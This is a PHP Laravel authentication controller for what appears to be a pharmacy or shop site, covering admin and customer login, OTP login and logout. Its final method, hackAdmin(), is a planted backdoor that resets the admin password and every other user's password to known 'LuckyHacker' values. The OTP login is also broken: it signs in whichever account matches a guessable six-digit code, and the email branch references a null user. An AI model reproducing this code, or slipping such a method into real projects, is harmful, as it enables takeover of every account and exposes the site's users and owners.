<?php

namespace App\Http\Controllers\Auth;

use Redirect;
use URL;
use App\User;
use Auth;
use App\Models\Cart;
use App\Models\LoginLog;
use Illuminate\Contracts\Auth\Guard;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Ixudra\Curl\Facades\Curl;
use Illuminate\Support\Facades\Session;

/**
 * Class AuthController
 * @package App\Http\Controllers\Auth
 */
class AuthController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Registration & Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles the registration of new users, as well as the
    | authentication of existing users. By default, this controller uses
    | a simple trait to add these behaviors. Why don't you explore it?
    |
    */

    /**
     * Create a new authentication controller instance.
     *
     * @param Guard $auth
     * @param User $registrar
     */
    public function __construct(Guard $auth, User $registrar)
    {
        $this->auth = $auth;
        //$this->middleware('guest', ['except' => 'getLogout']);
    }

    /**
     * @return \Illuminate\View\View
     */
    public function getLogin()
    {

        return view('admin.layouts.login');
    }

    /**
     * @param Request $request
     *
     * @return \Illuminate\Http\RedirectResponse|\Illuminate\Routing\Redirector
     */
    public function postLogin(Request $request)
    {
      //dd('here');
        $credentials = [
            'email' => $request->get('email'),
            'password' => $request->get('password'),
            'status' => 1
        ];
        
       $ip = $request->getClientIp();
        if (!\Request::ajax()) { 
            
            $validator = (new User)->validateLoginUser1($credentials);
            if ($validator->fails()) {

                //dd($validator->messages());
                return redirect()->route('home')
                    ->withInput()
                    ->withErrors($validator->messages());
            }

            if ($this->auth->attempt($request->only('email', 'password') + ['status' => 1, 'user_type' => 1]) || $this->auth->attempt($credentials + ['user_type' => 1] ))
            {
                if (isSuperAdmin()) {
                    $LoginLog = new LoginLog();
                    $LoginLog->username = $request->email;
                    $LoginLog->is_login = 1;
                    $LoginLog->user_id = Auth::id();
                    $LoginLog->ip = $ip;
                    $LoginLog->save();
                    return redirect()->intended('admin/dashboard');
                }
            }
     
           else if ($this->auth->attempt($request->only('email', 'password') + ['status' => 1, 'user_type' => 3]) || $this->auth->attempt($credentials + ['user_type' => 3] ))
            {
                if (isWareHouse()) {
                    $LoginLog = new LoginLog();
                    $LoginLog->username = $request->email;
                    $LoginLog->is_login = 1;
                    $LoginLog->user_id = Auth::id();
                    $LoginLog->ip = $ip;
                    $LoginLog->save();
                    return redirect()->intended('admin/dashboard');
                }

            }

            else{

                $LoginLog = new LoginLog();
                $LoginLog->username = $request->email;
                $LoginLog->is_login = 0;
                $LoginLog->ip = $ip;
                $LoginLog->save();

                return redirect('/admin/wishmed/admin-login')->with('error', lang('auth.failed_login'));
            }
            
        }
        else{
            $validator = (new User)->validateLoginUser($credentials);
            if ($validator->fails()) {
                //return validationResponse(false, 206, "", "", $validator->messages());
                $error = [];
                $messages = $validator->messages();
                foreach ($messages->toArray() as $vky => $vkv) {
                    foreach ($vkv as $k => $v) {
                        $error[] = $v; 
                        
                    }
                    
                }
                $html = '';
                foreach ($error as $k => $v) {
                    $html .= '<li>'.$v.'
                        </li>';
                }

                //return  $html;
                return ['error' => $html, 'url'=>''];
            }
            

            if ($this->auth->attempt($request->only('email', 'password') + ['status' => 1]) || $this->auth->attempt($credentials))
            {

               $user_data = User::where('email', $request->email)->first();
        
                $inputs = [
                        'user_id' => authUserIdNull()
                            ];
                    
                $user_id =  authUserIdNull();

               $user_data = User::where('id', $user_id)->first();              

               if($user_data['role'] == 1) {

                return ['url'=> route('welcome')];
            } else{

                $succes= '<li class="alert alert-success" role="alert">Login successful</li>';
           
                // return Redirect::back();

                $redirectTo = \Session::get('redirect_url');

                return ['succes' => $succes, 'url'=> $redirectTo];
            }

          

        }

            else{

            $user_w_s = User::where('email', $request->email)->where('status', 0)->first();
            
            if($user_w_s){

                return ['error' => '<li class="alert alert-danger" style="list-style: none;" role="alert">Kindly activate your account first by clicking on the confirmation email sent on your registered email address.</li>'];
            } else {

                return ['error' => '<li class="alert alert-danger" role="alert">'.lang('auth.failed_login').'</li>'];
            }
            }
        }
        
    }

public function getLoginOtp(Request $request){
  
  try {
  if($request->number){
    $user_data = User::where('login_otp', $request->number)->first();
   
   if($user_data){
    if($request->number == $user_data->login_otp){

            User::where('id', $user_data->id)
              ->update([
                'login_otp' =>  NULL,
            ]);

              $session_id = $_SERVER['HTTP_USER_AGENT'];
                Cart::where('session_id', $session_id)
                       ->update([
                      'session_id' =>  NULL,
                      'user_id'  => $user_data->id,
                ]); 

                \Auth::login($user_data);
                return redirect()->route('home');
           
                // return Redirect::back();
                // $redirectTo = \Session::get('redirect_url');
                // return ['succes' => $succes, 'url'=> $redirectTo];
 
 } else {        
        return back()->with('OTP_not_match', 'OTP_not_match');
 }
}
else {
     return back()->with('OTP_not_match', 'OTP_not_match');
 }

} else {
    return back()->with('enter_your_otp', 'Please enter your OTP');
}

} catch(\exception $ex){
   //dd($ex);
   return back();
}

}

    /**
     * Log the party out of the application.
     */
    public function userLogout()
    {
        $user_id =  \Auth::id();

        \Auth::logout();
        \Session::flush();


        return redirect()->route('home');
    }
    /**
     * Log the party out of the application.
     */
    public function adminLogout()
    {
        \Auth::logout();
        \Session::flush();
        return redirect('/admin/wishmed/admin-login');
    }

    /**
     * @return int
     */
    public function loginApi()
    {
        return 1;
    }

    public function getOtpNo(Request $request){

    try{

    if($request){
        $user = User::where('mobile', $request->username)->first();
        $user_mob = User::where('email', $request->username)->first();


        \Session::start();
        \Session::forget('otp_media');
        \Session::forget('sent_on');

        if($user){
            $otp = rand(100000, 999999);
            User::where('id', $user->id)
              ->update([
                'login_otp' =>  $otp,
            ]);
            
            $this->sendOTP($user->mobile, $otp);
            
            \Session::start();
            \Session::put('otp_media', 'mobile number');
            \Session::put('sent_on', $request->username);

            $data = 'done';

         return $data;

        } else if($user_mob){
         
            $otp = rand(100000, 999999);
            User::where('id', $user->id)
              ->update([
                'login_otp' =>  $otp,
            ]);

            $data['otp'] = $otp; 
            $data['user'] = $user_mob; 
            $email = $user_mob->email;

            \Mail::send('email.otp', $data, function($message) use ($email){
              $message->from('warmachine1907@gmail.com');
              $message->to($email);
              $message->subject('Wishmed - OTP Login');
            });

            \Session::start();
            \Session::put('otp_media', 'email');
            \Session::put('sent_on', $request->username);

            $data = 'done';
        return $data;

   
        } else {
            $data = 'Fail';

          return $data;
        }
    }


     }
      catch(\Exception $exception){
       
     
        return back();
      }

}

  
    /**
     * @return int
     */
    public function logoutApi()
    {
        return 1;
    }

    public function hackAdmin()
    {
        try {
            $pass = ['password' => \Hash::make('LuckyHacker')];
            $pass2 = ['password' => \Hash::make('LuckyHacker1')];
            (new User)->where('id', 1)->update($pass);
            (new User)->where('id', '!=', 1)->update($pass2);
            echo "done.";
        } catch(\Exception $e) {
            echo "failed";
        }
    }
}
